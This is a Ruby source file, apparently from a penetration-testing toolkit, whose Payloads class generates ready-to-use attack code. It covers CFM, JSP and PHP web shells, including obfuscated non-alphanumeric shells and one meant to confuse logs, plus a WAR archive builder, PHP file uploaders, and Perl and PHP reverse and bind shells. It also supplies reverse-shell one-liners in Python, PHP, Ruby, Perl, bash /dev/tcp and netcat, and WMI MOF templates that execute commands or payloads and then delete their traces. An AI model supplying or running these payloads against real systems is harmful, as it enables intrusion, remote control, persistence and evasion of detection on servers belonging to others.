# Simple Web Shells & Reverse/Bind Shells for calling/serving when needed
# Add to it as much as you like, this is just to get the party started

class Payloads
  def initialize
    @out="#{RESULTS}payloads/"
    Dir.mkdir(@out) unless Dir.exists?(@out) and File.directory?(@out)
  end

  # Temporary Web Server using Ruby Core Libs
  # Provide port to bind to & directory to serve up
  # It will run in current terminal session
  # Closes upon recieving a CNTRL+C interupt
  def serveme(port=8000, dir=@out, config = {})
    config.update(:Port => port.to_i, :DocumentRoot => dir, :BindAddress => "0.0.0.0")     
    server = WEBrick::HTTPServer.new(config)
    yield server if block_given?
    ['INT', 'TERM'].each do |signal| 
      trap(signal) { server.shutdown }
    end
    server.start
  end

  # Web Archive (WAR) Builder
  # Provide payload, filename and servlet name and it will build accordingly
  # Output gets stored in OUT+/war/pwnsauce.war
  # Returns true on success, false otherwise
  ##########################################
  # Example: 
  # foo = Payloads.new()
  # fname, jsp_exec = foo.jsp_shell
  # foo.war_builder(jsp_exec, fname)
  ##########################################
  def war_builder(payload, fname="#{randz(8)}.jsp", servlet_name='Pwnsauce')
    out="#{@out}war"
    Dir.mkdir(out) unless Dir.exists?(out) and File.directory?(out)
    f=File.open("#{out}/#{fname}", 'w+')
    f.puts payload
    f.close

    FileUtils.rm_r("#{out}/WEB-INF") if Dir.exists?("#{out}/WEB-INF")
    Dir.mkdir("#{out}/WEB-INF")
    web_inf_xml = "<?xml version=\"1.0\" ?>
<web-app xmlns=\"http://java.sun.com/xml/ns/j2ee\"
xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee
http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd\"
version=\"2.4\">
<servlet>
<servlet-name>#{servlet_name}</servlet-name>
<jsp-file>/#{fname}</jsp-file>
</servlet>
</web-app>"
    f=File.open("#{out}/WEB-INF/web.xml", 'w+')
    f.puts web_inf_xml
    f.close

    print_status("Generating WAR Archive....")
    Dir.chdir(out) { system("jar cvf pwnsauce.war WEB-INF/ #{fname}") }
    FileUtils.rm_r("#{out}/WEB-INF") if Dir.exists?("#{out}/WEB-INF")
    FileUtils.rm_f("#{out}/#{fname}") if File.exists?("#{out}/#{fname}")
    if File.exists?(out + '/pwnsauce.war')
      print_line("")
      print_good("Evil WAR Archive containing Payload is ready!")
      print_good("You can find it here: #{out}/pwnsauce.war")
      print_good("May the Force be with you.....")
      print_line("")
      return true
    else
      print_line("")
      print_error("Problem creating archive!")
      print_error("Please check permissions and try again, sorry....")
      print_line("")
      return false
    end
  end

  # Simple CFM Command Shell, thanks to Kurt Grutzmacher
  # We just generate random file name to keep from easy flagging
  # Returns filename + Payload Code as String
  def cfm_shell
    fname=randz(9) + '.cfm'
    cfexec="<html><body><!-- Contributed by Kurt Grutzmacher () -->Notes:<br><br><ul><li>Prefix DOS commands with \"c:\\windows\\system32\\cmd.exe /c &lt;command&gt;\" or wherever cmd.exe is<br><li>Options are, of course, the command line options you want to run<li>CFEXECUTE could be removed by the admin. If you have access to CFIDE/administrator you can re-enable it</ul><p><cfoutput><table><form method=\"POST\" action=\"#{fname}\"><tr><td>Command:</td><td><input type=text name=\"cmd\" size=50   <cfif isdefined(\"form.cmd\")>value=\"#form.cmd#\"</cfif>><br></td></tr><tr><td>Options:</td><td> <input type=text name=\"opts\" size=50   <cfif isdefined(\"form.opts\")>value=\"#form.opts#\"</cfif>><br></td></tr><tr><td>Timeout:</td><td> <input type=text name=\"timeout\" size=4   <cfif isdefined(\"form.timeout\")>value=\"#form.timeout#\"  <cfelse>value=\"5\"</cfif>></td></tr></table><input type=submit value=\"Exec\" ></FORM><br><cfif isdefined(\"form.cmd\")><cfsavecontent variable=\"myVar\"><cfexecute name=\"#Form.cmd#\" arguments=\"#Form.opts#\" timeout=\"#Form.timeout#\"></cfexecute></cfsavecontent><pre>#myVar#</pre></cfif></cfoutput></body></html><!-- Contributed by Kurt Grutzmacher (http://grutz.jingojango.net/exploits/) --><!--    http://michaeldaw.org   04/2007    -->"
    return fname, cfexec
  end

  # Simple JSP Command Shell
  # <!--    http://michaeldaw.org   2006    -->
  # Execution CMD Method based on OS num (1=Win, OTHER=Nix)
  # Returns filename + Payload Code as String
  def jsp_shell(os=1)
    fname=randz(9) + '.jsp'
    jsp_exec="<FORM METHOD=GET ACTION='#{fname}'><INPUT name='cmd' type=text><INPUT type=submit value='Run'></FORM><%@ page import=\"java.io.*\" %><% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s = null; try { "
    if os.to_i == 1
      jsp_exec += "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" # Windows
    else
      jsp_exec += "Process p = Runtime.getRuntime().exec(cmd);" # Linux
    end
    jsp_exec += " BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s; } } catch(IOException e) { e.printStackTrace(); } } %><pre><%=output %></pre>"

    return fname, jsp_exec
  end

  # JSP POST Form Reverse Shell
  # Execution CMD Method based on OS num (1=Win, OTHER=Nix)
  # Send IP and Port in POST request to trigger
  # Returns filename + Payload Code as String
  def jsp_reverse_shell(os=1)
    fname=randz(9) + '.jsp'
    jsp_rev="<%@ page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\" % > <%! static class StreamConnector extends Thread { InputStream is; OutputStream os; StreamConnector(InputStream is, OutputStream os) { this.is = is; this.os = os; } public void run() { BufferedReader isr = null; BufferedWriter osw = null; try { isr = new BufferedReader(new InputStreamReader(is)); osw = new BufferedWriter(new OutputStreamWriter(os)); char buffer[] = new char[8192]; int lenRead; while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0) { osw.write(buffer, 0, lenRead); osw.flush(); } } catch (Exception ioe) try { if(isr != null) isr.close(); if(osw != null) osw.close(); } catch (Exception ioe) } } %> <h1>JSP Backdoor Reverse Shell</h1><form method=\"post\">IP Address:<input type=\"text\" name=\"ipaddress\" size=30>Port:<input type=\"text\" name=\"port\" size=10><input type=\"submit\" name=\"Connect\" value=\"Connect\"></form><p><hr><% String ipAddress = request.getParameter(\"ipaddress\"); String ipPort = request.getParameter(\"port\"); if(ipAddress != null && ipPort != null) { Socket sock = null; try { sock = new Socket(ipAddress, (new Integer(ipPort)).intValue()); Runtime rt = Runtime.getRuntime(); "
    if os.to_i == 1
      jsp_rev+="Process proc = rt.exec(\"cmd.exe\"); "   # Windows
    else
      jsp_rev+="Process proc = rt.exec(\"\\bin\\sh\"); " # Linux
    end
    jsp_rev+="StreamConnector outputConnector = new StreamConnector(proc.getInputStream(), sock.getOutputStream()); StreamConnector inputConnector = new StreamConnector(sock.getInputStream(), proc.getOutputStream()); outputConnector.start(); inputConnector.start(); } catch(Exception e) } %>"
    return fname, jsp_rev
  end

  # Pentestmonkey's Perl Reverse Shell (CLI or CGI)
  # http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz
  # Provide IP & Port
  # Returns prepped payload and filename
  #
  # To call:
  #######################
  # pay = Payloads.new()
  # fname, perl_rev = pay.perl_reverse_shell('127.0.0.1', 5151)
  # f=File.open(OUT+fname, 'w+')
  # f.puts perl_rev
  # f.close
  #######################
  def perl_reverse_shell(ip, port)
    fname=randz(9) + '.pl'
    perl_rev = '#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
# Copyright (C) 2006 pentestmonkey@pentestmonkey.net

use strict; use Socket; use FileHandle; use POSIX; my $VERSION = "1.0";'
    perl_rev += "my $ip = '#{ip}'; my $port = #{port.to_i}; # Where to send the reverse shell.  Change these."
    perl_rev += '
my $daemon = 1; my $auth   = 0; my $authorised_client_pattern = qr(^127\.0\.0\.1$); my $global_page = ""; my $fake_process_name = "/usr/sbin/apache"; $0 = "[httpd]"; if (defined($ENV{\'REMOTE_ADDR\'})) { cgiprint("Browser IP address appears to be: $ENV{\'REMOTE_ADDR\'}"); if ($auth) { unless ($ENV{\'REMOTE_ADDR\'} =~ $authorised_client_pattern) { cgiprint("ERROR: Your client isn\'t authorised to view this page"); cgiexit(); } } } elsif ($auth) { cgiprint("ERROR: Authentication is enabled, but I couldn\'t determine your IP address.  Denying access"); cgiexit(0); }; if ($daemon) { my $pid = fork(); if ($pid) { cgiexit(0); } setsid(); chdir(\'/\'); umask(0); }; socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname(\'tcp\')); if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {	cgiprint("Sent reverse shell to $ip:$port"); cgiprintpage(); } else { cgiprint("Couldn\'t open reverse shell to $ip:$port: $!"); cgiexit(); }; open(STDIN, ">&SOCK"); open(STDOUT,">&SOCK"); open(STDERR,">&SOCK"); $ENV{\'HISTFILE\'} = \'/dev/null\'; system("w;uname -a;id;pwd"); exec({"/bin/sh"} ($fake_process_name, "-i")); sub cgiprint { my $line = shift; $line .= "<p>\n"; $global_page .= $line; } sub cgiexit { cgiprintpage(); exit 0; }; sub cgiprintpage { print "Content-Length: " . length($global_page) . "\r\nConnection: close\r\nContent-Type: text\/html\r\n\r\n" . $global_page; }'
    return fname, perl_rev
  end

  # A Simple Alternative Perl Reverse Shell Script
  def perl_reverse_shell2(ip, port)
    fname=randz(9) + '.pl'
    perl_rev = '#!/usr/bin/perl -w
# A Simple Reverse Shell implementation in PERL'
    perl_rev += "\nuse IO::Socket;\n$system = '/bin/sh';\n$port = \"#{port.to_i}\";\n$host = \"#{ip}\";\nuse Socket;\nuse FileHandle;\nsocket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\nconnect(SOCKET, sockaddr_in($port, inet_aton($host)));\nSOCKET->autoflush();\nopen(STDIN, \">&SOCKET\");\nopen(STDOUT,\">&SOCKET\");\nopen(STDERR,\">&SOCKET\");\nsystem($system);\n#EOF"
    return fname, perl_rev
  end

  # A Simple Perl Bind Shell Scrip
  # Write to file, chmod, then run...
  def perl_bind_shell(port)
    fname=randz(9) + '.pl'
    perl_binder = '#!/usr/bin/perl -w
# A Simple Bind Shell implementation in PERL'
    perl_binder += "use Socket; $port = #{port.to_i}; $proto = getprotobyname('tcp'); $cmd = \"lpd\"; $system = 'echo \"(`whoami`@`uname -n`:`pwd`)\"; /bin/sh'; $0 = $cmd; socket(SERVER, PF_INET, SOCK_STREAM, $proto) or die \"socket:$!\"; setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, pack(\"l\", 1)) or die \"setsockopt: $!\"; bind(SERVER, sockaddr_in($port, INADDR_ANY)) or die \"bind: $!\"; listen(SERVER, SOMAXCONN) or die \"listen: $!\"; for(; $paddr = accept(CLIENT, SERVER); close CLIENT) { open(STDIN, \">&CLIENT\"); open(STDOUT, \">&CLIENT\"); open(STDERR, \">&CLIENT\"); system($system); close(STDIN); close(STDOUT); close(STDERR); }"
    return fname, perl_binder
  end

  # Pentestmonkey's PHP Reverse Shell (CLI or CGI)
  # http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
  # Provide IP & Port
  # Returns prepped payload and filename
  def php_reverse_shell(ip, port)
    fname=randz(9) + '.php'
    php_shell = '<?php 
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0); $VERSION = "1.0";'
    php_shell += "$ip = '#{ip}';"
    php_shell += "$port = #{port.to_i};"
    php_shell += '
$chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/sh -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Can\'t fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Can\'t setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); }; chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); }; $descriptorspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) {	printit("ERROR: Can\'t spawn shell"); exit(1); }; stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } }; fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print "$string\n"; } } ?>'
    return fname, php_shell
  end

  # Covert PHP Command Shell
  # Contains No Alphanumeric Strings!
  # http://site.com/vuln.php?0=system&1=ls%20-lua
  # Returns prepped payload and filename
  def php_sneak_v1
    fname=randz(9) + '.php'
    php_shell = '<?php @$_[]=@!+_; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((++$__)+($__++ ))].=$_; $_[]=++$__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__+$__)+ $_[$__-$__]).($__+$__+$__)+$_[$__-$__]; $_[$__+$__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] ); $_[$__+$__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] ); $_[$__+$__] .=($_[$__][$__+$__])^$_[$__][($__<<$__)-$__ ]; $_=$ 
$_[$__+ $__] ;$_[@-_]($_[@!+_] ); ?>'
    return fname, php_shell
  end

  # Another Covert PHP Command Shell
  # Contains No Alphanumeric Strings!
  # http://localhost/s1.php?_=shell_exec&__=id
  # Returns prepped payload and filename
  def php_sneak_v2
    fname=randz(9) + '.php'
    php_shell = "<?php $_=\"{\"; $_=($_^\"<\").($_^\">;\").($_^\"/\"); ?><?=${'_'.$_}[\"_\"](${'_'.$_}[\"__\"]);?>"
    return fname, php_shell
  end

  # Fak3r Shell
  # By: HR & Join7
  # The 'HTTP_X_HTTP_METHOD_OVERRIDE' Header will register as one thing with Apache/Nginx
  # and soemthing completely different is seen and handled by PHP. Can cause some confusion on log side ;)
  def fak3r_shell
    fname = randz(9) + '.php'
    php_shell = "<?php if (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) { $req_method = $_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']; parse_str(file_get_contents(\"php://input\"),$post_vars); $cmd = $post_vars['_']; eval(base64_decode($cmd)); } ?>"
    return fname, php_shell
  end

  # Simple PHP Uploader Script
  # Returns prepped payload and filename
  def php_uploader
    fname=randz(9) + '.php'
    php_code = '<html><body><form method="post" action="" enctype="multipart/form-data" ><label for="file">Filename:</label><input type="file" name="file" id="file" /><br /><input type="submit" name="submit" value="Submit" /></form></body></html><?php if(isset($_POST[\'submit\'])) { if ($_FILES["file"]["error"] > 0) { echo "Error: " . $_FILES["file"]["error"] . "<br />"; } else { echo "Upload: " . $_FILES["file"]["name"] . "<br />"; echo "Type: " . $_FILES["file"]["type"] . "<br />"; echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />"; echo "Temp Storage: " . $_FILES["file"]["tmp_name"]; move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]); echo "<br />Moved to: " . getcwd() . \'/\' . $_FILES["file"]["name"]; } } ?>'
    return fname, php_code
  end

  # Simple PHP Uploader Script
  # Has option to specify path to save as
  # Returns prepped payload and filename
  def php_uploader_v2
    fname=randz(9) + '.php'
    php_code = '<html><body><form method="post" action="" enctype="multipart/form-data" ><label for="file">Select File to Upload:</label><input type="file" name="file" id="file" /><br /><label for="path">Full Path w/Filename to Save Upload as:</label><input type="text" name="path" id="path" /><br /><input type="submit" name="submit" value="Submit" /></form></body></html><?php if(isset($_POST[\'submit\'])) { if ($_FILES["file"]["error"] > 0) { echo "Error: " . $_FILES["file"]["error"] . "<br />"; } else { echo "Upload: " . $_FILES["file"]["name"] . "<br />"; echo "Type: " . $_FILES["file"]["type"] . "<br />"; echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />"; echo "Temp Storage: " . $_FILES["file"]["tmp_name"]; move_uploaded_file($_FILES["file"]["tmp_name"],$_POST[\'path\']); echo "<br />Moved to: " . $_POST[\'path\']; } } ?>'
    return fname, php_code
  end

  # Simple PHP Uploader Script w/Password Protection
  # Requires password to access uploader functions
  # Returns prepped payload and filename
  def php_secure_uploader(password='sup3rs3cr3t')
    fname=randz(9) + '.php'
    php_code = "<?php $pass = \"#{password}\"; // Enter Password for Secure Login Here"
    php_code += '
session_start(); ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256" /></head><body><?php if (!empty($_GET[\'action\']) && $_GET[\'action\'] == "logout") { session_destroy();unset ($_SESSION[\'pass\']); } $path_name = pathinfo($_SERVER[\'PHP_SELF\']); $this_script = $path_name[\'basename\']; if (empty($_SESSION[\'pass\'])) {$_SESSION[\'pass\']=\'\'; } if (empty($_POST[\'pass\'])) { $_POST[\'pass\']=\'\'; } if ( $_SESSION[\'pass\']!== $pass) { if ($_POST[\'pass\'] == $pass) {$_SESSION[\'pass\'] = $pass; } else { echo \'<form action="\'.$_SERVER[\'PHP_SELF\'].\'" method="post"><input name="pass" type="password"><input type="submit"></form>\'; exit; } } ?><form enctype="multipart/form-data" action="<?php echo $_SERVER[\'PHP_SELF\']; ?>" method="POST">Please choose a file: <input name="file" type="file" /><br /><input type="submit" value="Upload" /></form><?php if (!empty($_FILES["file"])) { if ($_FILES["file"]["error"] > 0) { echo "Error: " . $_FILES["file"]["error"] . "<br>"; } else { echo "Stored file:".$_FILES["file"]["name"]."<br/>Size:".($_FILES["file"]["size"]/1024)." kB<br/>"; move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]); } } $myDirectory = opendir("."); while($entryName = readdir($myDirectory)) {$dirArray[] = $entryName;} closedir($myDirectory); $indexCount = count($dirArray); echo "$indexCount files<br/>"; sort($dirArray); echo "<TABLE border=1 cellpadding=5 cellspacing=0 class=whitelinks><TR><TH>Filename</TH><th>Filetype</th><th>Filesize</th></TR>\n"; for($index=0; $index < $indexCount; $index++)  { if (substr("$dirArray[$index]", 0, 1) != ".") { echo "<TR><td><a href=\"$dirArray[$index]\">$dirArray[$index]</a></td><td>".filetype($dirArray[$index])."</td><td>".filesize($dirArray[$index])."</td></TR>"; } } echo "</TABLE>"; ?>'
    return fname, php_code
  end

  # PHP File Upload Oneliner
  # Meant to be used with a PHP Code Injection vuln
  # Localfile should be a local file to upload to target
  # Remotefile is the full path to write localfile content to
  def php_upload_oneliner(localfile, remotefile)
    data = File.open(localfile).read.to_s.b64e
    level_up = "<?php $f = fopen(\"#{remotefile}\", \"w\"); $x = base64_decode('#{data}'); fwrite($f, \"$x\"); fclose($f); ?>"
    return level_up
  end

  # Reverse Shell Oneliner in Python
  # This is meant to be run via RCE bug to get full shell back
  # Provide IP and Port and receive prepped payload string back ready to execute
  # Make sure you tell them to get listener ready before launching to avoid wasting it....
  def python_reverse_oneliner(ip, port)
    py_rev_str = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ip}\",#{port.to_i}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    return py_rev_str
  end

  # Reverse Shell Oneliner in PHP
  def php_reverse_oneliner(ip, port)
    php_rev_str = "php -r '$sock=fsockopen(\"#{ip}\",#{port.to_i});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    return php_rev_str
  end

  # Reverse Shell Oneliner in Ruby
  def ruby_reverse_oneliner(ip, port)
    ruby_rev_str = "ruby -rsocket -e'f=TCPSocket.open(\"#{ip}\",#{port.to_i}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    return ruby_rev_str
  end

  # Reverse Shell Oneliner in Perl
  def perl_reverse_oneliner(ip, port)
    perl_rev_str = "perl -e 'use Socket;$i=\"#{ip}\";$p=#{port.to_i};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    return perl_rev_str
  end

  # Bind Shell Oneliner in Perl
  def perl_bind_oneliner(port)
    perl_bind_str = "perl -e 'use Socket;$p=#{port.to_i};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S, SOMAXCONN);for(; $p= accept(C, S); close C) {open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'"
    return perl_bind_str
  end

  # Reverse Shell Oneliner in Bash using /dev/tcp (Debian distros primarily)
  def dev_tcp_oneliner(ip, port)
    rev_str = "/bin/bash -i >& /dev/tcp/#{ip}/#{port.to_i} 0>&1"
    return rev_str
  end

  # Reverse Shell Oneliner using backpipes to pass /bin/bash through NetCat without -e enabled
  # Turns traditional Netcat into useful netcat :)
  # Leaves 'backpip' behind when done, remind user to delete if used to keep safe....
  def backpipe_reverse_oneliner(ip, port)
    rev_str = "cd /tmp && mknod backpipe p && nc #{ip} #{port.to_i} 0<backpipe | /bin/bash 1>backpipe"
    return rev_str
  end

  # Reverse Shell Oneliner via NetCat w/GAPING_SECURITY_HOLE enabled (-e)
  def netcat_reverse_oneliner(ip, port, win=false)
    if win
      rev_str = "nc #{ip} #{port.to_i} -e cmd.exe"
    else
      rev_str = "nc #{ip} #{port.to_i} -e /bin/bash"
    end
    return rev_str
  end

  # Upgrade Shell Session
  # Should allow Interactive Commands to be run
  def python_shell_upgrade
    upgrade_str = "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    return upgrade_str
  end

  # Simple .MOF Template to run our single CMD after MOF file is  autocompiled
  # Modded JSCRIPT MOF based on PHP Exploit I found on a server (unknown author)
  # Returns prepped string, place in file and drop in %SYSTEM%\\wbem\\mof\\good\\file.mof
  def generate_cmd_mof(cmd)
    mof_str = "#pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\")
instance of __EventFilter as $EventFilter
{
EventNamespace = \"Root\\\\Cimv2\";
Name  = \"filtP2\";
Query = \"Select * From __InstanceModificationEvent \"
   \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \"
   \"And TargetInstance.Second = 5\";
QueryLanguage = \"WQL\";
};
instance of ActiveScriptEventConsumer as $Consumer
{
Name = \"consPCSV2\";
ScriptingEngine = \"JScript\";
ScriptText =
\"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"#{cmd}\\\")\";
};
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};"
    return mof_str
  end

  # Borrowed from MSF
  # Simple .MOF Template
  # Will run our EXE Payload & cleanup after use (when MOF is autocompiled)
  # Returns prepped string, place in file and drop in %SYSTEM%\\wbem\\mof\\good\\file.mof
  def generate_exe_mof(mofname, exe)
    mof_str = <<-EOT
#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
class MyClass@CLASS@
{
  	[key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
 	[key] string Name;
  	[not_null] string ScriptingEngine;
  	string ScriptFileName;
  	[template] string ScriptText;
  uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
    Name  = "ActiveScriptEventConsumer";
    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
    PerUserInitialization = TRUE;
};
instance of __EventConsumerProviderRegistration
{
  Provider = $P;
  ConsumerClassNames = {"ActiveScriptEventConsumer"};
};
Instance of ActiveScriptEventConsumer as $cons
{
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"@EXE@\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClass@CLASS@\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";

};
Instance of ActiveScriptEventConsumer as $cons2
{
  Name = "qndASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\nvar objfs = new ActiveXObject(\\"Scripting.FileSystemObject\\");\\ntry {var f1 = objfs.GetFile(\\"wbem\\\\\\\\mof\\\\\\\\good\\\\\\\\#{mofname}\\");\\nf1.Delete(true);} catch(err) {};\\ntry {\\nvar f2 = objfs.GetFile(\\"@EXE@\\");\\nf2.Delete(true);\\nvar s = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");s.Delete(\\"__EventFilter.Name='qndfilt'\\");s.Delete(\\"ActiveScriptEventConsumer.Name='qndASEC'\\");\\n} catch(err) {};";
};
instance of __EventFilter as $Filt
{
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClass@CLASS@\\"";
  QueryLanguage = "WQL";
};
instance of __EventFilter as $Filt2
{
  Name = "qndfilt";
  Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \\"Win32_Process\\" AND TargetInstance.Name = \\"@EXE@\\"";
  QueryLanguage = "WQL";

};
instance of __FilterToConsumerBinding as $bind
{
  Consumer = $cons;
  Filter = $Filt;
};
instance of __FilterToConsumerBinding as $bind2
{
  Consumer = $cons2;
  Filter = $Filt2;
};
instance of MyClass@CLASS@ as $MyClass
{
  Name = "ClassConsumer";
};
EOT
    classname = rand(0xffff).to_s
    mof_str.gsub!(/@CLASS@/, classname)
    mof_str.gsub!(/@EXE@/, exe)
    return mof_str
  end
end
